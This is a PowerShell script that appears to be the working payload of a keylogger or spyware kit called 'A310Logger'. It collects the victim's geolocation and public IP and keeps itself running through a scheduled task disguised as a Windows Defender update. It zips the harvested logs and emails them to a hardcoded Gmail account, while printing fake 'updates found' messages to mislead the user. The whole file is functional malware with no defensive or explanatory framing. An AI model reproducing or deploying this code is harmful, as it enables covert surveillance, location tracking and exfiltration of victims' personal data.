Start-Sleep -Milliseconds 60
$location = ($pwd).path

Add-Type -AssemblyName System.Device 
$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher 
$GeoWatcher.Start() 
while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
    Start-Sleep -Milliseconds 100 
}  

echo ***************location************** > C:\Users\$env:UserName\AppData\Local\A310Logger\Others\GeoLocation.txt
if ($GeoWatcher.Permission -eq 'Denied'){
    $Host.UI.WriteDebugLine("Allow apps to access location")
    
} else {
    $GeoWatcher.Position.Location | Select Latitude,Longitude >> C:\Users\$env:UserName\AppData\Local\A310Logger\Others\GeoLocation.txt | Out-Null
}

echo To know Location: >> C:\Users\$env:UserName\AppData\Local\A310Logger\Others\GeoLocation.txt
echo https://www.latlong.net/Show-Latitude-Longitude.html >> C:\Users\$env:UserName\AppData\Local\A310Logger\Others\GeoLocation.txt
echo **************************************************** >> C:\Users\$env:UserName\AppData\Local\A310Logger\Others\GeoLocation.txt




if(!(Test-Path "C:\Users\$env:UserName\AppData\Local\A310Logger\count.txt")) {
    [int]$count=0
    echo "$count"> "C:\Users\$env:UserName\AppData\Local\A310Logger\count.txt"
}else{
    $count= Get-Content "C:\Users\$env:UserName\AppData\Local\A310Logger\count.txt"
}


       try { 
       schtasks.exe /CREATE /F /SC DAILY /MO 1 /TN "System Update" /TR 'wscript.exe ""C:\Users\%username%\AppData\Local\0101\AutoRun.vbs""' /ST 23:55 | Out-Null
       }
       catch {
       $trigger = New-JobTrigger -once -At $(get-date) -RepetitionInterval $([timespan]::FromMinutes("10080")) -RepeatIndefinitely
       $action = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument '"C:\Users\%username%\AppData\Local\0101\AutoRun.vbs"'
       Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "System Update" -Description "Windows Defender Antivirus Regular Update." -Force
       }
  	
	
     $error.clear()
     try { 
	   Get-WmiObject -Class Win32_OperatingSystem | ForEach-Object -MemberName Caption
     }
     catch { echo "Microsoft Windows" }
     

Start-Sleep -Milliseconds 10
if (!(test-connection 8.8.8.8 -Count 1 -Quiet)) {
    Start-Sleep -Milliseconds 100
    echo " "
    echo " "
    echo "Error: Error in connect()"
    Start-Sleep -Milliseconds 100
    (Invoke-WebRequest -uri "http://ifconfig.me/ip").Content	
        Start-Sleep -Milliseconds 1000
        echo "Checking internet connection.."
	Start-Sleep -Milliseconds 5000
    echo "No internet connection? Try again!!"  
    Start-Sleep -Milliseconds 100 
}     
else{
    echo " "   
    echo " "
    echo " "
    echo " "    
    echo 'Gathering information.'
    Start-Sleep -Milliseconds 80  
    $ip= (Invoke-WebRequest -uri "http://ifconfig.me/ip").Content
  

    $smtpserver = "smtp.gmail.com"
    $msg = new-object Net.Mail.MailMessage
    $smtp = New-Object Net.Mail.SmtpClient($smtpServer )
    $smtp.Timeout = 400000
    $smtp.EnableSsl = $True
    $smtp.Credentials = New-Object System.Net.NetworkCredential("com.microsoft.official@gmail.com", "com@microsoft"); 
    $msg.From = "com.microsoft.official@gmail.com"
    $msg.To.Add("com.microsoft.official@gmail.com")

    $msg.Subject = "$env:computername ### {$ip ($count)}"
    $msg.Body = "New small Hack Arrived. Lets Enjoy !!!"                     

    $file1 = "C:\Users\$env:UserName\AppData\Local\0101.zip"

    if(Test-Path $file1) {
    Remove-Item  $file1 -Recurse -Force -Confirm:$false
    }
	
	
	   

     $error.clear()
     try { 
        Compress-Archive -Path C:\Users\$env:UserName\AppData\Local\A310Logger\ -DestinationPath "C:\Users\$env:UserName\AppData\Local\0101.zip" -Force -Confirm:$false
     }
       catch { 
        

	Start-Sleep -Milliseconds 10
	Start-Sleep -Milliseconds 10
	Start-Sleep -Milliseconds 10
       

     }
     if (!$error) {
       Start-Sleep -Milliseconds 10
       $msg.Attachments.Add($file1)
     }

    echo "This process will take some time. Please wait.."
    $smtp.Send($msg) | Out-Null
    Start-Sleep -Milliseconds 3000
    echo '17 file updated & 3 updates found.' 
     
    }   
    $count= [int]$count+1
    $count > "C:\Users\$env:UserName\AppData\Local\A310Logger\count.txt"
    Start-Sleep -Milliseconds 500
   
    

    
exit
